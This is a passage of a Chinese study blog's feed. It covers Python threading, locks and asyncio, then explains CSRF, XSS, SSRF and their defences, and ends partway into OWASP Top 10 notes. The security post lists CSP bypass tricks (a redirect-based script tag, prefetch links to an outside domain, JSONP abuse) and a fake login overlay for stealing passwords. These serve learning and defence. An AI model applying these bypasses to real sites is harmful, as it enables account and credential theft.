class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p><strong>守护线程</strong>：只有所有守护线程都结束，整个Python程序才会退出，但并不是说Python程序会等待守护线程运行完毕，相反，当程序退出时，如果还有守护线程在运行，程序会去强制终结所有守护线程，当守所有护线程都终结后，程序才会真正退出。可以通过修改daemon属性或者初始化线程时指定daemon参数来指定某个线程为守护线程。</p><p><strong>非守护线程</strong>：一般创建的线程默认就是非守护线程，包括主线程也是，即在Python程序退出时，如果还有非守护线程在运行，程序会等待直到所有非守护线程都结束后才会退出。</p><p><strong>注</strong>：守护线程会在程序关闭时突然关闭（如果守护线程在程序关闭时还在运行），它们占用的资源可能没有被正确释放，比如正在修改文档内容等，需要谨慎使用。</p><h4 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;task&quot;</span>, n)<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;2s&#x27;</span>, n)<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1s&#x27;</span>, n)<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;0s&#x27;</span>, n)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    t1 = threading.Thread(target=run, args=(<span class="hljs-string">&quot;t1&quot;</span>,))<br>    t2 = threading.Thread(target=run, args=(<span class="hljs-string">&quot;t2&quot;</span>,))<br>    t1.start()    <span class="hljs-comment">#当调用start()时，才会真正的创建线程，并且开始执行</span><br>    <span class="hljs-comment"># t1.join() #调用join时与多进程一样，等待t1执行结束执行t2</span><br>    t2.start()<br></code></pre></td></tr></table></figure><p>利用lock机制，避免多个线程同时修改同一份数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread,Lock<br><span class="hljs-keyword">import</span> os,time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>():<br>    <span class="hljs-keyword">global</span> n<br>    lock.acquire() <span class="hljs-comment">#加锁</span><br>    temp=n<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    n=temp-<span class="hljs-number">1</span><br>    lock.release()  <span class="hljs-comment">#解锁</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    lock=Lock()<br>    n=<span class="hljs-number">100</span><br>    l=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        p=Thread(target=work)<br>        l.append(p)<br>        p.start()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;####################&quot;</span>)<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> l:<br>        p.join()<br>        <span class="hljs-built_in">print</span>(n)<br></code></pre></td></tr></table></figure><p>还有递归锁、信号量等多种机制避免数据竞争。</p><h4 id="ThreadPoolExecutor"><a href="#ThreadPoolExecutor" class="headerlink" title="ThreadPoolExecutor"></a>ThreadPoolExecutor</h4><p>注意：当属于一个 <code>Future</code> 对象的可调用对象等待另一个 <code>Future</code> 的返回时，会发生死锁 <code>deadlock</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> urllib.request<br><br>URLS = [<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.sjtu.edu.cn/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://chujian521.github.io/&#x27;</span>]<br><br><span class="hljs-comment"># 检索单个页面并报告URL和内容</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_url</span>(<span class="hljs-params">url, timeout</span>):<br>    <span class="hljs-keyword">with</span> urllib.request.urlopen(url, timeout=timeout) <span class="hljs-keyword">as</span> conn:<br>        <span class="hljs-keyword">return</span> conn.read()<br><br><span class="hljs-comment"># 我们可以使用with语句来确保线程被及时清理</span><br><span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> executor:<br>    <span class="hljs-comment"># 启动加载操作，并用其URL标记每个future</span><br>    future_to_url = &#123;executor.submit(load_url, url, <span class="hljs-number">60</span>): url <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> URLS&#125;<br>    <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> concurrent.futures.as_completed(future_to_url):<br>        url = future_to_url[future]<br>        <span class="hljs-keyword">try</span>:<br>            data = future.result()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> exc:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%r generated an exception: %s&#x27;</span> % (url, exc))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%r page is %d bytes&#x27;</span> % (url, <span class="hljs-built_in">len</span>(data)))<br><br></code></pre></td></tr></table></figure><p>注：concurrent.futures.as_completed(fs, timeout&#x3D;None)<br>当通过 fs 指定的 Future 实例全部执行完毕或者被取消后，返回这些 Future 实例组成的迭代器。fs 中的 Future 实例可以被不同的执行器创建。任何在 as_completed() 调用之前就已经完成的 Future 实例会被最先生成。</p><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><h4 id="asyncio"><a href="#asyncio" class="headerlink" title="asyncio"></a>asyncio</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>(<span class="hljs-params">num: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    一个工作协程，接收一个数字，将它 +1 后返回</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;working <span class="hljs-subst">&#123;num&#125;</span> ...&#x27;</span>)<br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment"># 模拟耗时的IO操作</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;num&#125;</span> -&gt; <span class="hljs-subst">&#123;num+<span class="hljs-number">1</span>&#125;</span> done&#x27;</span>)<br>    <span class="hljs-keyword">return</span> num + <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    主协程，创建一系列并发协程并运行它们</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment"># 任务队列</span><br>    tasks = [work(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>)]<br>    <span class="hljs-comment"># 并发执行队列中的协程并等待结果返回</span><br>    results = <span class="hljs-keyword">await</span> asyncio.gather(*tasks)<br>    <span class="hljs-built_in">print</span>(results)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    asyncio.run(main())<br></code></pre></td></tr></table></figure><h2 id="Python锁"><a href="#Python锁" class="headerlink" title="Python锁"></a>Python锁</h2><ul><li>同步锁（互斥锁）：Lock，同步锁一次只能放行一个线程，一个被加锁的线程在运行时不会将执行权交出去，只有当该线程被解锁时才会将执行权通过系统调度交由其他线程。</li><li>递归锁：RLock（一次只能放行一个）递归锁是同步锁的一个升级版本，在同步锁的基础上可以做到连续重复使用多次acquire()后再重复使用多次release()的操作，但是一定要注意加锁次数和解锁次数必须一致，否则也将引发死锁现象。</li><li>条件锁：Condition（一次可以放行任意个）条件锁是在递归锁的基础上增加了能够暂停线程运行的功能。并且我们可以使用wait()与notify()来控制线程执行的个数。</li><li>事件锁：Event（一次全部放行）事件锁是基于条件锁来做的，它与条件锁的区别在于一次只能放行全部，不能放行任意个数量的子线程继续运行。</li><li>信号量锁：Semaphore（一次可以放行特定个）通过规定，成批的放行特定个处于“上锁”状态的线程，条件锁和事件锁放行的都是处于等待状态的线程</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF、XSS、SSRF傻傻分不清</title>
    <link href="/blog/2022/10/27/CSRF%E3%80%81XSS%E3%80%81SSRF%E5%82%BB%E5%82%BB%E5%88%86%E4%B8%8D%E6%B8%85/"/>
    <url>/blog/2022/10/27/CSRF%E3%80%81XSS%E3%80%81SSRF%E5%82%BB%E5%82%BB%E5%88%86%E4%B8%8D%E6%B8%85/</url>
    
    <content type="html"><![CDATA[<p><strong>OWASP中有两大类型的漏洞类型在前面的学习中没有整理的很明白，分别是客户端请求伪造（CSRF，Cross-Site Request Forgery）和服务端请求伪造（SSRF，Server-Side Request Forgery），XSS（Cross Site Scripting，跨站脚本攻击）。</strong></p><p><img src="/images/fj36.jpg"></p><span id="more"></span><h2 id="0x01-SSRF-服务端请求伪造"><a href="#0x01-SSRF-服务端请求伪造" class="headerlink" title="0x01 SSRF(服务端请求伪造)"></a>0x01 SSRF(服务端请求伪造)</h2><p>在上一篇文章介绍OWASP TOP 10 2021的时候，第十大漏洞就是<a href="https://chujian521.github.io/blog/2022/10/17/OWASP-Top-10-for-2021-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8B%EF%BC%89/#A10-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89">SSRF</a>。</p><h2 id="0x02-CSRF-跨站请求伪造"><a href="#0x02-CSRF-跨站请求伪造" class="headerlink" title="0x02 CSRF(跨站请求伪造)"></a>0x02 CSRF(跨站请求伪造)</h2><h3 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h3><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，可以理解为攻击者盗用受害者的身份，以受害者的名义去发送一些恶意的请求，以完成攻击者的攻击目的。</p><p>CSRF可以以受害者的名义发送邮件、盗取账号、购买商品、虚拟货币转账等，会造成个人隐私的泄露以及财产的安全。</p><h3 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h3><p><img src="/images/csrf.png"></p><p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p><ol><li><p>登录受信任网站A，并在本地生成Cookie。</p></li><li><p>在不登出A的情况下，访问危险网站B。</p></li></ol><p> 看似我们只要不满足以上两个条件，就不会引发CSRF的攻击，但是我们并不能说以下情况用户都会注意到：</p><ol><li>没有退出网站A，打开了一个新的Tab访问其他网站</li><li>关闭了浏览器之后不一定会结束一个会话，多数用户会觉得关闭浏览器后上次的会话A已经结束，这时候再访问会话B依然会遭到攻击。</li><li>恶意站点B可能是一个存在其他漏洞的可信任的、经常被访问的网站。</li></ol><p><strong>CSRF攻击是源于WEB的隐式身份验证机制，WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的</strong></p><h3 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h3><ol><li><strong>Token 验证：</strong>攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于cookie中，因此攻击者可以在不知道用户验证信息的情况下直接利用用户的cookie来通过安全验证。<strong>在请求中放入攻击者所不能伪造的信息，并且该信总不存在于cookie之中，即可防止此类攻击</strong>。服务器发送给客户端一个token；客户端提交的表单中带着这个token；如果这个token不合法，那么服务器拒绝这个请求。</li><li><strong>Referer验证：</strong>Referer指的是页面请求来源。意思是，只接受本站的请求，服务器才做响应；如果不是，就拦截。（有一些方法可以篡改 Referer 值，用户可以设置不提供Referer，只采用这种方式依然有隐患<a href="https://www.cnblogs.com/-qing-/p/11015147.html">CSRF 花式绕过Referer技巧</a>）</li><li>设置验证码或者自定义http头并验证。</li><li><strong>设置 SameSite</strong>：设置 cookie 的 SameSite 值为 strict，这样只有同源网站的请求才会带上 cookie。这样 cookies 就不能被其他域名网站使用，达到了防御的目的。</li></ol><h2 id="0x03-XSS-跨站脚本攻击"><a href="#0x03-XSS-跨站脚本攻击" class="headerlink" title="0x03 XSS(跨站脚本攻击)"></a>0x03 XSS(跨站脚本攻击)</h2><p>在OWASP TOP 10中属于注入的一种 <a href="https://chujian521.github.io/blog/2022/10/13/OWASP-Top-10-for-2021-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#A03-%E6%B3%A8%E5%85%A5%E5%BC%8F%E6%94%BB%E5%87%BB">注入式攻击</a></p><h3 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h3><p>XSS 是一种在 web 应用中的安全漏洞，它允许恶意 web 用户将代码植入到 web 网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生 xss 攻击。</p><p>不需要你做任何的登录认证，它会通过合法的操作（比如在url中输入、在评论框中输入），向你的页面注入脚本（可能是js、hmtl代码块等）。</p><p>XSS可以盗取各种用户账号、劫持各种cookie资料，冒充用户身份进入网站、劫持回话，执行任意操作、 刷流量，DDos攻击，执行弹窗广告、 传播蠕虫病毒等。</p><h3 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h3><ul><li><strong>类型 1：反射式 XSS（或非持久性）</strong> - 服务器直接从 HTTP 请求读取数据，并将其反射回 HTTP 响应中。当攻击者导致受害者向易受攻击的 Web 应用程序提供危险内容，然后将其反射回受害者并由 Web 浏览器执行时，就会发生反射式 XSS 攻击。传递恶意内容的最常见机制是将其作为参数包含在公开发布或通过电子邮件直接发送给受害者的 URL 中。以这种方式构建的 URL 构成了许多网络钓鱼方案的核心，攻击者通过这些方案诱使受害者访问引用易受攻击站点的 URL。在网站将攻击者的内容反射回受害者后，内容由受害者的浏览器执行。</li><li><strong>类型 2：存储的 XSS（或持久）</strong> - 应用程序将危险数据存储在数据库、消息论坛、访问者日志或其他受信任的数据存储中。稍后，危险数据随后被读回应用程序并包含在动态内容中。从攻击者的角度来看，注入恶意内容的最佳位置是向许多用户或特别感兴趣的用户显示的区域。感兴趣的用户通常在应用程序中具有提升的权限，或者与对攻击者有价值的敏感数据进行交互。如果其中一个用户执行恶意内容，攻击者可能能够代表用户执行特权操作或访问属于用户的敏感数据。例如，攻击者可能会将 XSS 注入日志消息，而当管理员查看日志时，可能无法正确处理该消息。</li><li><strong>类型 0：基于 DOM</strong> 的 XSS - 在基于 DOM 的 XSS 中，客户端将 XSS 注入页面;在其他类型中，服务器执行注入。基于 DOM 的 XSS 通常涉及发送到客户端的服务器控制的受信任脚本，例如在用户提交表单之前对表单执行完整性检查的 Javascript。如果服务器提供的脚本处理用户提供的数据，然后将其注入回网页（例如使用动态 HTML），则可以使用 DOM 的 XSS。DOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的</li></ul><h3 id="预防措施-1"><a href="#预防措施-1" class="headerlink" title="预防措施"></a>预防措施</h3><ol><li>使用经过审查的库或框架，该库或框架不允许出现此弱点，或者提供使此弱点更容易避免的构造。例如：包括Microsoft的Anti-XSS库，OWASP ESAPI编码模块和Apache Wicket</li><li>对于将输出到另一个网页的任何数据，尤其是从外部输入接收的任何数据，请对所有非字母数字字符使用适当的编码。</li><li>为了帮助缓解针对用户会话 Cookie 的 XSS 攻击，请将会话 <strong>Cookie 设置为 HttpOnly</strong>。在支持 HttpOnly 功能的浏览器中（例如最新版本的 Internet Explorer 和 Firefox），此属性可以防止使用 document.cookie 的恶意客户端脚本访问用户的会话 Cookie。这不是一个完整的解决方案，因为并非所有浏览器都支持HttpOnly。更重要的是，XMLHTTPRequest 和其他强大的浏览器技术提供对 HTTP 标头的读取访问，包括设置 HttpOnly 标志的 Set-Cookie 标头。</li><li>输入验证：假设所有输入都是恶意的。使用“接受已知良好”的输入验证策略，即使用严格符合规范的可接受输入列表。拒绝任何不严格符合规范的输入，或将其转换为符合规范的输入。</li><li>当可接受的对象集（如文件名或 URL）受到限制或已知时，请创建从一组固定输入值（如数字 ID）到实际文件名或 URL 的映射，并拒绝所有其他输入。</li></ol><p>注：Cookie的一些安全属性：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>、<span class="hljs-keyword">domain</span>属性：决定该cookie作用在哪个域。<br><span class="hljs-number">2</span>、<span class="hljs-type">path</span>属性：决定该cookie字段作用在哪个路径下面。<br><span class="hljs-number">3</span>、secure属性：决定该cookie只能通过https传输。<br><span class="hljs-number">4</span>、HttpOnly属性：决定该cookie不能通过js读取。<br><span class="hljs-number">5</span>、expires属性：决定该cookie的过期时间<br></code></pre></td></tr></table></figure><h3 id="浏览器同源策略"><a href="#浏览器同源策略" class="headerlink" title="浏览器同源策略"></a>浏览器同源策略</h3><p>同源策略限制从一个源加载的文档或脚本与来自另一个源的资源进行交互的方式，是用于隔离潜在恶意文件的关键安全机制。同协议、同域名（或 IP）、以及同端口视为同一个域，一个域内的脚本仅仅具有本域内的权限，即本域脚本只能读写本域内的资源，而无法访问其它域的资源。这种安全限制称为同源策略。</p><h4 id="绕过同源策略"><a href="#绕过同源策略" class="headerlink" title="绕过同源策略"></a>绕过同源策略</h4><p>1.CORS跨域请求</p><p>是一种基于HTTP头的机制，其中的HTTP头决定浏览器<strong>是否阻止</strong>前端 JavaScript 代码获取跨域请求的响应，该机制允许 Web 应用服务器进行跨源访问控制，从而使跨源数据传输得以安全进行</p><p>Access-Control-Allow-Origin: <a href="http://foo.example/">http://foo.example</a><br>Access-Control-Allow-Methods: POST, GET, OPTIONS   &#x2F;&#x2F;表明服务器允许客户端使用 POST, GET 和 OPTIONS 方法发起请求<br>Access-Control-Allow-Headers: X-PINGOTHER, Content-Type   &#x2F;&#x2F;表明表明服务器允许请求中携带字段 X-PINGOTHER 与 Content-Type<br>Access-Control-Max-Age: 86400   &#x2F;&#x2F;该字段表明该响应的有效时间为 86400 秒，也就是 24 小时，在有效时间内，浏览器无须为同一请求再次发起预检请求</p><p>2.JSONP</p><p>3.iframe</p><h3 id="内容安全策略CSP"><a href="#内容安全策略CSP" class="headerlink" title="内容安全策略CSP"></a>内容安全策略CSP</h3><p>内容安全策略(CSP)，是一种安全策略，其原理是当浏览器请求某一个网站时，告诉该浏览器申明文件可以执行，什么不可以执行。<br>CSP的引入会使得我们的引入扩展程序更加安全，并且可以由开发者指定可以加载扩展程序的类型，避免恶意的脚本在浏览器中执行，造成信息泄露问题。<br>CSP对前端攻击的防御主要有两个：</p><p>1、限制js的执行。<br>2、限制对不可信域的请求。</p><p>CSP是如何工作的：<a href="https://www.freebuf.com/articles/web/260535.html">CSP常见配置及绕过姿势</a></p><p><strong>通过响应包头（Response Header）实现：</strong></p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp"><span class="hljs-attribute">Content-Security-policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&#x27;self&#x27;</span>; <span class="hljs-keyword">script-src</span> <span class="hljs-string">&#x27;self&#x27;</span> allowed.com; <span class="hljs-keyword">img-src</span> <span class="hljs-string">&#x27;self&#x27;</span> allowed.com; <span class="hljs-keyword">style-src</span> <span class="hljs-string">&#x27;self&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>通过HTML 元标签实现：</strong></p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;<span class="hljs-keyword">default-src</span> <span class="hljs-string">&#x27;self&#x27;</span>; <span class="hljs-keyword">img-src</span> https://*; <span class="hljs-keyword">child-src</span> <span class="hljs-string">&#x27;none&#x27;</span>;&quot;&gt;<br></code></pre></td></tr></table></figure><h4 id="CSP的绕过策略"><a href="#CSP的绕过策略" class="headerlink" title="CSP的绕过策略"></a>CSP的绕过策略</h4><ol><li>配置CSP规则错误，header(“Content-Security-Policy: default-src ‘self ‘; script-src * “);导致允许加载任何域的js</li><li>如果只允许加载当前域，可以寻找有没有文件上传的位置，让恶意js成为当前域</li><li>如果静态文件的可信域被放到static之类的文件夹中，并且设置可信域限制到文件夹，那么我们可以寻找有没有可控的重定向，利用重定向加载<code>&lt;script src=&quot;static/302.php?url=upload/test.jpg&quot;&gt; </code></li><li>在CSP1.0中，对于link的限制并不完整，CSP可以组织不可信域的请求，但是<code>&lt;link rel=&quot;prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; (H5预加载)(only chrome)  &lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; （DNS预加载）</code>预加载在早期CSP限制不完整</li><li>程序员在前端代码中写了一段执行输入字符串的js，这样CSP就失去了作用</li><li>可能会使用jsonp来跨域获取数据，但jsonp本身就是CSP的克星，jsonp本身就是处理跨域问题的，所以它一定在可信域中，就可以利用jsonp构造任意js（可以把返回类型设置为json格式）（注：JSONP(JSON with Padding)是JSON的一种“使用模式”，可用于解决主流浏览器的跨域数据访问的问题。由于同源策略，一般来说位于 server1.example.com 的网页无法与不是 server1.example.com的服务器沟通，而 HTML 的<code>&lt;script&gt;</code> 元素是一个例外。利用 <code>&lt;script&gt; </code>元素的这个开放策略，网页可以得到从其他来源动态产生的 JSON 资料，而这种使用模式就是所谓的 JSONP。用 JSONP 抓到的资料并不是 JSON，而是任意的JavaScript，用 JavaScript 直译器执行而不是用 JSON 解析器解析。）</li><li>可以把代码保存在CSP信任的网站上，例如pastebin</li></ol><h3 id="绕过防御措施"><a href="#绕过防御措施" class="headerlink" title="绕过防御措施"></a>绕过防御措施</h3><h4 id="如何绕过HttpOnly？"><a href="#如何绕过HttpOnly？" class="headerlink" title="如何绕过HttpOnly？"></a>如何绕过HttpOnly？</h4><ol><li>直接获取用户名密码：可以用这个JS代码画一个假的登录框，覆盖到真的登录框之上，让用户信以为真，这样就可以偷到真实的用户名和密码了。 或者通过JavaScript构造GET,POST请求。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OWASP-Top-10-for-2021-学习笔记（下）</title>
    <link href="/blog/2022/10/17/OWASP-Top-10-for-2021-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/blog/2022/10/17/OWASP-Top-10-for-2021-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>继续进行OWASP TOP 10部分的内容的学习，上半部分对前四种类型的分类进行了学习记录，这次继续对后面几种类型进行学习</strong></p><p><img src="/images/fj35.jpg"></p><span id="more"></span><h2 id="A05-安全设定缺陷"><a href="#A05-安全设定缺陷" class="headerlink" title="A05 安全设定缺陷"></a>A05 安全设定缺陷</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>从2017版本中的第六名上升至2021最新版本中的第五名，90%的应用程序都被测试出各类明显的设定缺陷。随着越来越多的高度可配置软件出现，此类别的上升并不让人意外。与此类相对应的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16：配置 </a>：此类别中的弱点通常在软件配置期间引入。</li><li><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611：对 XML 外部实体引用的不当限制</a>：软件处理一个 XML 文档，该文档可能包含具有 URI 的 XML 实体，这些 URI 解析为预期控制范围之外的文档，从而导致产品在其输出中嵌入不正确的文档。（缓解措施：可以将许多 XML 分析器和验证程序配置为禁用外部实体扩展。）</li></ul><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>如果程序包含以下几个因素，则有可能容易受到攻击：</p><ul><li>在应用程序堆栈的任意部分缺少适当的安全加固，或者在云服务上配置了不适当的权限。</li><li>不必要的功能被安装或者启用（比如不必要的端口、服务、页面、账户或者是权限）</li><li>默认的账户和密码仍然是可用状态并且未作修改。</li><li>错误处理向用户显示堆栈跟踪或其他信息过多的错误消息。</li><li>对于已经升级的系统，之前的安全特性被禁用或者是没有安全地配置。</li><li>应用服务、框架、库和数据库等的安全设置没有被设定成安全的值。</li><li>服务器不发送安全头或指令，或者没有将它们设置为安全值。</li><li>软件版本太旧或者本身存在漏洞。</li></ul><p>如果没有一致的、可重复的应用程序安全配置流程，系统将面临更高的风险。</p><h3 id="如何预防"><a href="#如何预防" class="headerlink" title="如何预防"></a>如何预防</h3><p>应实施安全的安装过程，包括:</p><ul><li>可重复的安全加固过程使部署另一个适当锁定的环境变得快速和容易。开发、QA和生产环境都应该配置相同，在每个环境中使用不同的凭证。这个过程应该是自动化的，以减少设置新的安全环境所需的工作量。</li><li>一个最小的平台，没有任何不必要的特性、组件、文档和示例。删除或不安装不使用的特性和框架。</li><li>作为补丁管理过程的一部分，审查和更新适用于所有安全注释、更新和补丁的配置的任务，检查云存储权限（例如S3（Simple Storage Service，简单存储服务）存储桶，（S3为任意类型的文件提供临时或永久的存储服务。用于存储图片、视频、音乐和文档。S3是专为大型，非结构化的数据块设计的））</li><li>分段的应用程序体系结构通过分段、容器化或云安全组(ACL)在组件或租户之间提供有效和安全的分离。</li><li>向客户端发送安全指令，例如，安全头。</li><li>在所有环境中验证配置和设置有效性的自动化过程。</li></ul><h3 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h3><p><strong>情境 #1:</strong> 已经上线的程序服务器带有预设的样本程序没有移除，这个样本程序带有已知的安全缺陷，可被攻击者利用入侵服务器。比如预设的程序带有管理员页面，并且没有修改默认的管理员账号密码，攻击者可以使用预设的密码登录，并获得控制权。</p><p><strong>情境 #2:</strong> 数据文件目录查看权限并未在服务器上关闭。攻击者可以找出并且下载已编译过 Java 代码，并且通过反编译与逆向工程等手法，查看原始代码。再通过源代码找出应用程序中严重的存取控制缺陷。</p><p><strong>情境 #3:</strong> 程序服务器的设定中允许输出带有详细内容的错误信息，例如堆栈追踪，供用户查看。这有可能导致敏感讯息的外泄，或间接透露出使用中并带有脆弱性的组件版本。</p><p><strong>情境 #4:</strong> 一个云端服务器，给其他在网际网路的 CSP 用户提供了预设权限分享，这将导致云端储存的敏感资料可以被存取。</p><h4 id="XXE利用方式"><a href="#XXE利用方式" class="headerlink" 